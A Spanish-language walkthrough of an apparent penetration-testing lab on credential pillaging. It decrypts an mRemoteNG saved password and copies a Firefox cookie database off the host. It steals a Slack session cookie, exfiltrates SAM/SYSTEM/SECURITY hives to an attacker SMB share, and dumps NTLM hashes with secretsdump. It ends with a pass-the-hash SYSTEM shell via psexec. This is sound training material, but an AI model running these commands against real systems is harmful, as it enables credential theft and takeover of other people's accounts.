PS C:\Users\Peter> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVe
PS C:\Users\Peter> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                                        DisplayVe
-----------                                                        ---------
Google Chrome
Microsoft Edge
Microsoft Edge Update
Microsoft Edge WebView2 Runtime
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29325
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.24.28127
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
mRemoteNG
```

Vemos que este usuario tiene instalado mRemoteNG, que nos permite conectarnos remotamente a otros equipos.

### Pregunta 2

> Busque el archivo de configuración de la aplicación que identifique e intente obtener las credenciales del usuario Grace. ¿Cuál es la contraseña de la cuenta local Grace?

#### Archivo de configuración de mRemoteNG

```powershell
PS C:\Users\Peter> ls C:\Users\Peter\AppData\Roaming\mRemoteNG

    Directory: C:\Users\Peter\AppData\Roaming\mRemoteNG


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/17/2022   9:05 AM                Themes
-a----         3/28/2025   8:34 AM           3366 confCons.xml
-a----         8/17/2022   9:07 AM           3366 confCons.xml.20220817-0907212031.backup
-a----         8/17/2022   9:07 AM           3366 confCons.xml.20220817-0907256254.backup
-a----         8/17/2022   9:07 AM           3366 confCons.xml.20220817-0907447503.backup
-a----         8/17/2022   9:07 AM           3366 confCons.xml.20250328-0833347124.backup
-a----         3/28/2025   8:33 AM           3365 confCons.xml.20250328-0833347749.backup
-a----         3/28/2025   8:33 AM           3366 confCons.xml.20250328-0834063999.backup
-a----         3/28/2025   8:34 AM           3365 confCons.xml.20250328-0834064624.backup
-a----         3/28/2025   8:34 AM           3366 confCons.xml.20250328-0834195253.backup
-a----         3/28/2025   8:34 AM           3366 confCons.xml.20250328-0834296812.backup
-a----         3/28/2025   8:34 AM           3365 confCons.xml.20250328-0834297593.backup
-a----         3/28/2025   8:34 AM             51 extApps.xml
-a----         3/28/2025   8:34 AM           6303 mRemoteNG.log
-a----         3/28/2025   8:34 AM           2259 pnlLayout.xml
```

Vamos a echarle un ojo a `confCons.xml`. Lo podemos abrir desde el navegador:

{% code overflow="wrap" %}

```xml
<?xml version="1.0" encoding="UTF-8"?>

-<mrng:Connections ConfVersion="2.6" Protected="fWYvBV+VWhsaCZQgyA830mo2bO+D5nABHOCgkhXK5JL+YTt7iqqXedA2Z/d+ajO1dF4u/N3xuYZrYF5ODg2mNPG8" FullFileEncryption="false" KdfIterations="1000" BlockCipherMode="GCM" EncryptionEngine="AES" Export="false" Name="Connections" xmlns:mrng="http://mremoteng.org">

<Node Name="Grace_Local_Acct" InheritRDGatewayDomain="false" InheritRDGatewayPassword="false" InheritRDGatewayUsername="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayHostname="false" InheritRDGatewayUsageMethod="false" InheritVNCViewOnly="false" 
< ---- SNIP ---- 
Password="r8fs92xC9ewhBWvZmqMCsd0dFZFsMyqmVl9I27U64WAM7qR2tJajEaf+uvVb+GAI1d+T0PBJ69p0y1o=" Domain="PILLAGING-WIN01" Username="grace" Id="88291c0c-b6b0-4f2d-b180-81d3b50485a4" Panel="General" Icon="mRemoteNG" Descr="Grace Account" Type="Connection"/>

</mrng:Connections>
```

{% endcode %}

Podemos usar el script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) para descifrar la contraseña desde nuestro Kali Linux:

```shell-session
afsh4ck@kali$ python3 mremoteng_decrypt.py -s "r8fs92xC9ewhBWvZmqMCsd0dFZFsMyqmVl9I27U64WAM7qR2tJajEaf+uvVb+GAI1d+T0PBJ69p0y1o="
Password: Princess01!
```

Obtenemos la contraseña en plano!

### Pregunta 3

> Inicie sesión como Grace y busque las cookies del sitio web `slacktestapp.com`. Use la cookie para iniciar sesión en `slacktestapp.com` desde un navegador dentro de la sesión RDP y envíe la alerta.

```
xfreerdp /v:10.129.43.43 /u:Grace /p:Princess01!
```

Una vez dentro vemos que Grace tiene instalado Slack. Vamos a obtener las cookies:

#### Extracción de Cookies de Firefox

```powershell
PS C:\Users\Grace> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
PS C:\Users\Grace> ls

    Directory: C:\Users\Grace


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         8/17/2022   9:11 AM                3D Objects
d-r---         8/17/2022   9:11 AM                Contacts
d-r---         8/17/2022   9:11 AM                Desktop
d-r---         8/17/2022   9:11 AM                Documents
d-r---         8/17/2022   9:52 AM                Downloads
d-r---         8/17/2022   9:11 AM                Favorites
d-r---         8/17/2022   9:11 AM                Links
d-r---         8/17/2022   9:11 AM                Music
d-r---         8/17/2022   9:12 AM                OneDrive
d-r---         8/17/2022   9:12 AM                Pictures
d-r---         8/17/2022   9:11 AM                Saved Games
d-r---         8/17/2022   9:12 AM                Searches
d-r---         3/28/2025   8:46 AM                Videos
-a----         9/23/2022  10:46 AM         524288 cookies.sqlite
```

Tenemos el archivo `cookies.sqlite`, vamos a enviar a nuestro Kali Linux con Impacket-smbserver:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ sudo impacket-smbserver -smb2support CompData /home/kali/Descargas/
</strong>[sudo] contraseña para kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
</code></pre>

En Windows:

```powershell
PS C:\Users\Grace> move cookies.sqlite \\10.10.15.98\CompData
```

Ahora vamos a usar el script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) para extraer cookies de la base de datos `cookies.SQLite` de Firefox..

```shell-session
afsh4ck@kali$ python3 cookiextractor.py --dbpath cookies.sqlite

(1, '', '_ga', 'GA1.2.1096664302.1660755385', '.mozilla.org', '/', 1723827384, 1663944928857000, 1660755384718001, 0, 0, 0, 1, 0, 2)
(2, '', '_gid', 'GA1.2.1899769093.1660755385', '.mozilla.org', '/', 1660841784, 1660755517937000, 1660755384718002, 0, 0, 0, 1, 0, 2)
(3, '', '_gat', '1', '.mozilla.org', '/', 1660755444, 1660755384734000, 1660755384734001, 0, 0, 0, 1, 0, 2)
(10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
```

Tenemos la cookie de Slack en la última línea. Necesitamos limpiarla de la siguiente manera:

```
xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==
```

Vamos a usar el Plugin de Cookie Editor para insertar la Cookie, modificando el valor de la `cookie d` que ya existe:

<figure><img src="/files/0BRVNGXQ38SsIodtbJgz" alt=""><figcaption></figcaption></figure>

Y introducimos la cookie tratada en el campo Value:

<figure><img src="/files/95PSskpg76yKLvHrykri" alt=""><figcaption></figcaption></figure>

Pulsamos en el icono de Guardar y recargamos la página para acceder sin introducir ninguna contraseña:

<figure><img src="/files/ks0v2Sh9LqbEcLM1r4Tp" alt=""><figcaption></figcaption></figure>

Tenemos la flag y las credenciales del usuario `jeff`

### Pregunta 4

> Inicie sesión como Jeff a través de RDP y busque la contraseña para las copias de seguridad de RESTIC. Envíe la contraseña como respuesta.

```
xfreerdp /v:10.129.43.43 /u:Jeff /p:Webmaster001!
```

Al acceder encontramos el documento de configuración en el escritorio, que contiene la contraseña y el directorio del backup.

<figure><img src="/files/ALIOCQumME2ysupTGpr9" alt=""><figcaption></figcaption></figure>

### Pregunta 5

> Restaura el directorio que contiene los archivos necesarios para obtener los hashes de contraseñas de los usuarios locales. Enviar el hash del administrador como respuesta.

```powershell
PS C:\Users\jeff> restic.exe -r E:\restic snapshots

enter password for repository:
repository 2e40703c opened successfully, password is correct
found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
02d25030  2022-08-09 05:58:15  PILLAGING-WIN01              C:\xampp\htdocs\webapp
24504d3d  2022-08-09 11:24:43  PILLAGING-WIN01              C:\Windows\System32\config
7b9cabc8  2022-08-09 11:25:47  PILLAGING-WIN01              C:\Windows\System32\config
4e7bd0cd  2022-08-09 11:55:33  PILLAGING-WIN01              C:\xampp\htdocs\webapp_old
b2f5caa0  2022-08-17 11:43:56  PILLAGING-WIN01              C:\Windows\System32\config
--------------------------------------------------------------------------------------
5 snapshots
```

El directorio crítico para extraer los hashes de contraseñas locales en Windows es **`C:\Windows\System32\config`**, donde se encuentran los archivos **SAM**, **SYSTEM** y **SECURITY**.

Para restaurar el backup más reciente del directorio, ejecutamos:

```powershell
PS C:\Users\jeff> restic.exe -r E:\restic restore b2f5caa0 --target C:\restored

enter password for repository:
repository 2e40703c opened successfully, password is correct
found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
restoring <Snapshot b2f5caa0 of [C:\Windows\System32\config] at 2022-08-17 11:43:56.2484457 -0700 PDT by PILLAGING-WIN01\Administrator@PILLAGING-WIN01> to C:\restored
```

Ahora si vamos a la ruta `C:\restored\C\Windows\System32\config` encontramos los archivos de SAM, SECURITY y SYSTEM, necesarios para dumpear todos los hashes de los usuarios de Active Directory.

```powershell
PS C:\Users\jeff> cd C:\restored\C\Windows\System32\config
PS C:\restored\C\Windows\System32\config> ls


    Directory: C:\restored\C\Windows\System32\config


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/3/2022   8:35 AM                bbimigrate
d-----         12/7/2019   1:14 AM                Journal
d-----         12/7/2019   1:14 AM                RegBack
d-----         12/7/2019   1:14 AM                systemprofile
d-----          8/3/2022   7:36 AM                TxR
-a----          8/9/2022  12:15 PM        1310720 BBI
-a----          8/9/2022  12:15 PM          65536 SAM
-a----          8/9/2022  12:15 PM          32768 SECURITY
-a----          8/9/2022  12:15 PM       72089600 SOFTWARE
-a----          8/9/2022  12:15 PM       16515072 SYSTEM
```

Vamos a enviarlos a Kali con Impacket-smbserver:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ sudo impacket-smbserver -smb2support CompData /home/kali/Descargas/
</strong>
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
</code></pre>

```powershell
PS C:\restored\C\Windows\System32\config> move SAM \\10.10.14.179\CompData
PS C:\restored\C\Windows\System32\config> move SECURITY \\10.10.14.179\CompData
PS C:\restored\C\Windows\System32\config> move SYSTEM \\10.10.14.179\CompData
```

Si vamos al directorio Descargas en Kali tendremos los 3 archivos. Vamos a dumpear los hashes.

```shell-session
afsh4ck@kali$ sudo impacket-secretsdump -sam ~/Descargas/SAM -system ~/Descargas/SYSTEM -security ~/Descargas/SECURITY LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x9828e7264dd454a4cae19b10e003858e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bac9dc5b7b4bec1d83e0e9c04b******:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2525a827e7ca4bb2504d25a70e4d1292:::
jeff:1004:aad3b435b51404eeaad3b435b51404ee:91b2e2ed6cd72ed531635c1b58eabe19:::
Grace:1005:aad3b435b51404eeaad3b435b51404ee:2abc09f151d5e95fb8805e265268e6c3:::
Peter:1006:aad3b435b51404eeaad3b435b51404ee:8160b16dddc064509c4ccf530c7dfaa0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0c515ca185a031a258fba59bfe8b9b5079b9cd81
dpapi_userkey:0x87780b202abd6fd714986a152e820acdf3679f58
[*] NL$KM 
 0000   72 A4 3D 8A DE 00 7E FB  6E 82 26 A0 57 A3 10 E9   r.=...~.n.&.W...
 0010   DC F0 E9 DA E5 1B 7E 94  83 EE 9F B5 3E A7 73 C1   ......~.....>.s.
 0020   C7 A8 0C 92 1A 3F 77 A1  12 77 20 4F 66 69 2A 31   .....?w..w Ofi*1
 0030   B8 CC 43 3B AE EF 8D B4  AB F1 80 23 3F E0 E7 BA   ..C;.......#?...
NL$KM:72a43d8ade007efb6e8226a057a310e9dcf0e9dae51b7e9483ee9fb53ea773c1c7a80c921a3f77a11277204f66692a31b8cc433baeef8db4abf180233fe0e7ba
[*] Cleaning up... 
```

Tenemos el hash del administrador!

### Pregunta 6

> Utilice el hash con una técnica Pass-The-Hash para iniciar sesión como administrador.

No podemos acceder por RDP ya que lo tenemos deshabilitado por motivos de seguridad. Al intentar bypassearlo añadiendo una regla tampoco podemos, por lo que vamos a usar impacket-psexec para ganar una shell como SYSTEM:

```shell-session
afsh4ck@kali$ impacket-psexec administrator@10.129.43.43 -hashes :bac9dc5b7b4bec1d83e0e9c04b******
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.43.43.....
[*] Found writable share ADMIN$
[*] Uploading file dxqKgGpv.exe
[*] Opening SVCManager on 10.129.43.43.....
[*] Creating service cTFS on 10.129.43.43.....
[*] Starting service cTFS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system
```
